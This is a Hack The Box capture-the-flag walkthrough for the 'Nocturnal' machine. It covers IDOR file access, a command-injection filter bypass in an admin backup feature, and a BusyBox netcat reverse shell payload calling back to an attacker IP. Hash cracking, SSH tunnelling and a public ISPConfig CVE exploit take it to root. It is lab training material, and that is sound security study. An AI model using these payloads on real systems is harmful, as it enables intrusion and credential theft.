# HTB - Nocturnal
<img width="400" height="413" alt="image" src="https://github.com/user-attachments/assets/db53df5b-edf3-4d4d-a337-637ccceea298" />



## Reconnaissance

### Port Scanning

To begin the assessment, a full TCP SYN scan was conducted across all ports using the following command:

```bash
sudo nmap -sS -Pn -n -p- --min-rate 5000 10.10.11.64
````

![Full port scan](images/Pasted%20image%2020250727143751.png)

Once open ports were identified, a service/version detection scan was executed against the relevant ports:

```bash
sudo nmap -sCV -Pn -n -p22,80 10.10.11.64
```

![Service detection](images/Pasted%20image%2020250727143936.png)

The scan revealed the hostname `http://nocturnal.htb`. The hostname was added to the `/etc/hosts` file for name resolution:

![Hosts entry](images/Pasted%20image%2020250727144211.png)

---

## Web Exploration

Accessing the domain:

![Website homepage](images/Pasted%20image%2020250727144235.png)

A test user account was created:

![Test user created](images/Pasted%20image%2020250727144334.png)

The upload functionality accepted the following file extensions: `.pdf`, `.doc`, `.docx`, `.xls`, `.xlsx`, `.odt`.

![Upload filetypes](images/Pasted%20image%2020250727144655.png)

By analyzing the request structure and upload behavior, it was possible to manipulate the `username` and `file` parameters to access files uploaded by other users:

![Parameter tampering](images/Pasted%20image%2020250727145006.png)

---

## Enumeration and File Discovery

A brute-force attack was launched to discover possible users and filenames:

![Brute-force](images/Pasted%20image%2020250727152938.png)

Discovered:

* **Username:** `amanda`
* **File:** `privacy.odt`

![File found](images/Pasted%20image%2020250727153012.png)

The file was accessed and downloaded using:

```
http://nocturnal.htb/view.php?username=amanda&file=privacy.odt
```

![File downloaded](images/Pasted%20image%2020250727153131.png)

Upon inspection, the file revealed Amanda’s credentials:

![Credentials extracted](images/Pasted%20image%2020250727153219.png)

With these credentials, access to an admin panel was granted:

![Admin access](images/Pasted%20image%2020250727153308.png)

---

## Vulnerability in Admin Panel

Reviewing `admin.php` exposed a vulnerable **backup feature**:

![Backup vulnerability](images/Pasted%20image%2020250727153329.png)

### Vulnerability Summary

* Admins could generate ZIP backups of the directory, protected by a user-supplied password.
* The password was passed to the `zip` command inside a `proc_open()` shell call.
* Input sanitization via `cleanEntry()` was weak, blacklisting characters like `;`, `&`, `|`, `$`, spaces, etc.
* No robust escaping or whitelisting was applied.

To test for command injection, the POST request was intercepted and the `password` parameter was modified as follows:

```http
POST /admin.php HTTP/1.1
Host: nocturnal.htb
...
Content-Type: application/x-www-form-urlencoded
...

password=%0abash%09-c%09"whoami"&backup=
```

**Explanation of payload:**

* `%0a`: newline to terminate previous input
* `%09`: URL-encoded tab character
* `bash -c "whoami"`: command to be executed

![Command injection test](https://miro.medium.com/v2/resize\:fit:700/1*v9oRPOPOuTWfR2fwdcHlHQ.png)

---

## Reverse Shell

Once command injection was confirmed, a reverse shell was executed using BusyBox netcat:

```bash
password=%0abash%09-c%09"busybox%09nc%0910.10.14.20%094444%09-e%09/bin/bash”&backup=
```

![Payload sent](https://miro.medium.com/v2/resize\:fit:388/1*GEcOas5C_hPieT-HceJgtQ.png)

Listener on the attacking machine:

![Listener](images/Pasted%20image%2020250727143254.png)

A shell was obtained, and SQLite was used to dump user hashes from the internal database. The user containing the flag was **tobias**:

![Database dump](images/Pasted%20image%2020250727143507.png)

The password hash was cracked using [https://hashes.com](https://hashes.com/):

![Hash cracked](images/Pasted%20image%2020250727143326.png)

SSH access was achieved using Tobias’s credentials:

```bash
ssh tobias@nocturnal.htb
```

![SSH session](images/Pasted%20image%2020250727153703.png)

---

## Pivoting: Accessing Internal Services

During local enumeration, an internal service was discovered on port **8080**. To access it, an SSH tunnel was created:

```bash
ssh -L 8081:127.0.0.1:8080 tobias@nocturnal.htb
```

![Port forwarding](https://miro.medium.com/v2/resize\:fit:700/1*rE930kDY1XVJl9wmgZ6ErA.png)

The forwarded port revealed an **ISPConfig** interface:

* **Username:** admin
* **Password:** slowmotionapocalypse

![ISPConfig login](https://miro.medium.com/v2/resize\:fit:361/1*8EfRE_MuT-yDx7WsCSFRcA.png)

---

## Remote Code Execution (RCE)

ISPConfig was running a version vulnerable to:

> **CVE-2023-46818** — Remote Code Execution

A public exploit was retrieved from GitHub:

[https://github.com/engranaabubakar/CVE-2023-46818](https://github.com/engranaabubakar/CVE-2023-46818)

The exploit successfully escalated privileges to **root**, completing the challenge.

![Root access](https://miro.medium.com/v2/resize\:fit:700/1*3UbdM_Teou82L1XZcnoYPA.png)
